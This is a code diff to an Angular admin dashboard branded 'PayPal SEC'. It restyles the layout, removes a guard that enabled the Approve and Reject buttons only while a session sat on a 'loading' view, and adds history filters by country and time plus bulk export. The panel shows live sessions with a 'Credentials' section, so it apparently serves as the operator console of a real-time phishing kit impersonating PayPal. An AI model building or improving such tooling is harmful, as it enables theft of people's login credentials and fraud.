@@ -11,7 +11,7 @@ type AdminTab = 'live' | 'history' | 'settings';
   standalone: true,
   imports: [CommonModule, FormsModule],
   template: `
-    <div class="flex flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy min-h-screen lg:h-screen lg:overflow-hidden">
+    <div class="flex h-screen flex-col lg:flex-row bg-pp-bg font-sans text-pp-navy overflow-hidden">
       
       <!-- Toast Notification -->
       @if (state.adminToast()) {
@@ -47,7 +47,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       } @else {
 
       <!-- SIDEBAR -->
-      <aside class="w-full lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0 sticky top-0 lg:static">
+      <aside class="w-full h-16 lg:w-[260px] lg:h-full bg-pp-navy text-white flex lg:flex-col shrink-0 transition-all duration-300 z-30 shadow-xl items-center lg:items-stretch justify-between lg:justify-start px-4 lg:px-0">
            <div class="h-16 lg:h-20 flex items-center lg:px-6 lg:border-b border-[#ffffff10]">
               <span class="font-bold text-xl tracking-tight">PayPal <span class="text-pp-success text-xs align-top">SEC</span></span>
            </div>
@@ -84,7 +84,7 @@ type AdminTab = 'live' | 'history' | 'settings';
       </aside>
 
       <!-- MAIN CONTENT -->
-      <main class="flex-1 flex flex-col relative bg-pp-bg min-h-0 lg:h-full lg:overflow-hidden">
+      <main class="flex-1 flex flex-col h-[calc(100vh-64px)] lg:h-screen relative bg-pp-bg overflow-hidden">
          
          <!-- Top Bar (Desktop Only) -->
          <header class="hidden lg:flex h-16 bg-white border-b border-slate-200 items-center justify-between px-6 shrink-0 z-20 shadow-sm">
@@ -105,7 +105,7 @@ type AdminTab = 'live' | 'history' | 'settings';
          </header>
 
          <!-- Content Area -->
-         <div class="w-full flex-1 lg:overflow-hidden relative flex flex-col">
+         <div class="flex-1 overflow-hidden relative">
             
             @switch (activeTab()) {
                 
@@ -113,8 +113,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                 @case ('live') {
                     <div class="flex flex-col lg:flex-row h-full">
                         
-                        <!-- List Column -->
-                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[250px] lg:h-full">
+                        <!-- List Column (Fixed Width on Desktop, Top on Mobile) -->
+                        <div class="lg:w-[350px] bg-white border-b lg:border-b-0 lg:border-r border-slate-200 flex flex-col shrink-0 h-[300px] lg:h-full">
                              <div class="p-4 border-b border-slate-100 bg-slate-50/50 flex justify-between items-center shrink-0">
                                  <h3 class="font-bold text-base text-pp-navy">Active Sessions</h3>
                                  <span class="bg-pp-blue text-white text-xs px-2 py-1 rounded-md font-bold">{{ state.activeSessions().length }}</span>
@@ -150,11 +150,11 @@ type AdminTab = 'live' | 'history' | 'settings';
                              </div>
                         </div>
 
-                        <!-- Details Column -->
-                        <div class="flex-1 flex flex-col lg:h-full lg:overflow-hidden bg-[#F9FAFB] relative min-h-[500px] lg:min-h-0">
+                        <!-- Details Column (Flexible, Independent Scroll) -->
+                        <div class="flex-1 flex flex-col h-full overflow-hidden bg-[#F9FAFB] relative">
                              @if(monitoredSession()) {
-                                 <!-- Header -->
-                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm sticky top-0 lg:static">
+                                 <!-- Header (Sticky) -->
+                                 <div class="p-4 lg:p-6 border-b border-slate-100 flex justify-between items-center bg-white shrink-0 z-10 shadow-sm">
                                      <div>
                                          <div class="flex items-center gap-3 mb-1">
                                             <h2 class="font-bold text-lg lg:text-xl text-pp-navy">Session Details</h2>
@@ -174,7 +174,7 @@ type AdminTab = 'live' | 'history' | 'settings';
                                  </div>
                                  
                                  <!-- Scrollable Content -->
-                                 <div class="flex-1 lg:overflow-y-auto p-4 lg:p-8 pb-32 lg:pb-32">
+                                 <div class="flex-1 overflow-y-auto p-4 lg:p-8 pb-32">
                                      <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                          
                                          <!-- Credentials -->
@@ -293,8 +293,8 @@ type AdminTab = 'live' | 'history' | 'settings';
                                      </div>
                                  </div>
 
-                                 <!-- Action Bar (Fixed Bottom) -->
-                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm fixed bottom-0 left-0 right-0 lg:absolute lg:bottom-0 z-20 flex justify-between items-center shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)]">
+                                 <!-- Action Bar (Sticky Bottom) -->
+                                 <div class="p-4 border-t border-slate-200 bg-white/90 backdrop-blur-sm absolute bottom-0 left-0 right-0 z-20 flex justify-between items-center shadow-lg">
                                      <div class="flex items-center gap-2">
                                          <span class="h-2 w-2 rounded-full" [class.animate-pulse]="isSessionLive(monitoredSession())" [class.bg-pp-success]="isSessionLive(monitoredSession())" [class.bg-slate-300]="!isSessionLive(monitoredSession())"></span>
                                          <span class="text-xs font-bold text-slate-500 hidden sm:block">{{ isSessionLive(monitoredSession()) ? 'Live Connection' : 'Offline' }}</span>
@@ -305,10 +305,10 @@ type AdminTab = 'live' | 'history' | 'settings';
                                               <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Revoke
                                               </button>
-                                              <button (click)="reject()" [disabled]="!canInteract()" [class.opacity-50]="!canInteract()" [class.cursor-not-allowed]="!canInteract()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
+                                              <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
                                                   Reject
                                               </button>
-                                              <button (click)="approve()" [disabled]="!canInteract()" [class.opacity-50]="!canInteract()" [class.cursor-not-allowed]="!canInteract()" class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                                              <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
                                                   <span class="material-icons text-sm">check</span> {{ approveText() }}
                                               </button>
                                          </div>
@@ -332,9 +332,47 @@ type AdminTab = 'live' | 'history' | 'settings';
 
                 <!-- HISTORY TAB -->
                 @case ('history') {
-                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden lg:h-full flex flex-col h-[600px]">
-                        <div class="px-8 py-6 border-b border-slate-100">
-                            <h3 class="font-bold text-lg text-pp-navy">Session History</h3>
+                    <div class="bg-white rounded-card shadow-sm border border-slate-100 overflow-hidden h-full flex flex-col">
+
+                        <!-- Toolbar -->
+                        <div class="px-6 py-4 border-b border-slate-100 bg-slate-50/50 flex flex-col md:flex-row gap-4 items-center justify-between shrink-0">
+                            <h3 class="font-bold text-lg text-pp-navy shrink-0 hidden md:block">Session History</h3>
+
+                            <div class="flex flex-col md:flex-row items-center gap-3 w-full md:w-auto">
+                                <!-- Bulk Actions -->
+                                @if(selectedSessionIds().size > 0) {
+                                    <div class="flex items-center bg-pp-navy text-white rounded-lg px-2 py-1 animate-fade-in shadow-lg">
+                                        <span class="text-xs font-bold px-2">{{ selectedSessionIds().size }} selected</span>
+                                        <div class="h-4 w-px bg-white/20 mx-1"></div>
+                                        <button (click)="bulkExport()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Export Selected"><span class="material-icons text-sm">download</span></button>
+                                        <button (click)="bulkPin()" class="p-1.5 hover:bg-white/10 rounded transition-colors" title="Pin Selected"><span class="material-icons text-sm">push_pin</span></button>
+                                        <button (click)="bulkDelete()" class="p-1.5 hover:bg-red-500 rounded transition-colors" title="Delete Selected"><span class="material-icons text-sm">delete</span></button>
+                                    </div>
+                                }
+
+                                <!-- Filters -->
+                                <div class="flex items-center gap-2 w-full md:w-auto">
+                                    <div class="relative flex-1 md:w-64">
+                                        <span class="material-icons absolute left-3 top-2.5 text-slate-400 text-sm">search</span>
+                                        <input type="text" [ngModel]="searchQuery()" (ngModelChange)="searchQuery.set($event)" placeholder="Search sessions..." class="w-full pl-9 pr-4 py-2 text-sm border border-slate-200 rounded-lg focus:outline-none focus:border-pp-blue transition-colors">
+                                    </div>
+
+                                    <select [ngModel]="timeFilter()" (ngModelChange)="timeFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer">
+                                        <option value="6h">Last 6 Hours</option>
+                                        <option value="24h">Last 24 Hours</option>
+                                        <option value="7d">Last 7 Days</option>
+                                        <option value="all">All Time</option>
+                                        <option value="custom">Custom Range</option>
+                                    </select>
+
+                                    <select [ngModel]="countryFilter()" (ngModelChange)="countryFilter.set($event)" class="px-3 py-2 text-sm border border-slate-200 rounded-lg bg-white focus:outline-none focus:border-pp-blue cursor-pointer max-w-[120px]">
+                                        <option value="all">All Countries</option>
+                                        @for(c of uniqueCountries(); track c) {
+                                            <option [value]="c">{{ c }}</option>
+                                        }
+                                    </select>
+                                </div>
+                            </div>
                         </div>
 
                         <!-- Custom Date Range (Conditional) -->
@@ -611,10 +649,10 @@ type AdminTab = 'live' | 'history' | 'settings';
                             <button (click)="revoke()" class="bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Revoke
                             </button>
-                                              <button (click)="reject()" [disabled]="!canInteract()" [class.opacity-50]="!canInteract()" [class.cursor-not-allowed]="!canInteract()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-4 lg:px-6 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm transition-all shadow-sm">
+                            <button (click)="reject()" class="bg-slate-100 hover:bg-slate-200 text-slate-700 border border-slate-200 px-6 py-3 rounded-full font-bold text-sm transition-all shadow-sm">
                                 Reject
                             </button>
-                                              <button (click)="approve()" [disabled]="!canInteract()" [class.opacity-50]="!canInteract()" [class.cursor-not-allowed]="!canInteract()" class="bg-pp-navy hover:bg-pp-blue text-white px-6 lg:px-8 py-2 lg:py-3 rounded-full font-bold text-xs lg:text-sm shadow-button transition-all flex items-center gap-2">
+                            <button (click)="approve()" class="bg-pp-navy hover:bg-pp-blue text-white px-8 py-3 rounded-full font-bold text-sm shadow-button transition-all flex items-center gap-2">
                                 <span class="material-icons text-sm">check</span> {{ approveText() }}
                             </button>
                         </div>
@@ -714,11 +752,6 @@ export class AdminDashboardComponent {
       const id = this.state.monitoredSessionId();
       if (!id) return null;
       return this.state.activeSessions().find(s => s.id === id);
-  });
-
-  canInteract = computed(() => {
-      const session = this.monitoredSession();
-      return session?.data?.currentView === 'loading';
   });
 
   elapsedTime = signal('0m');
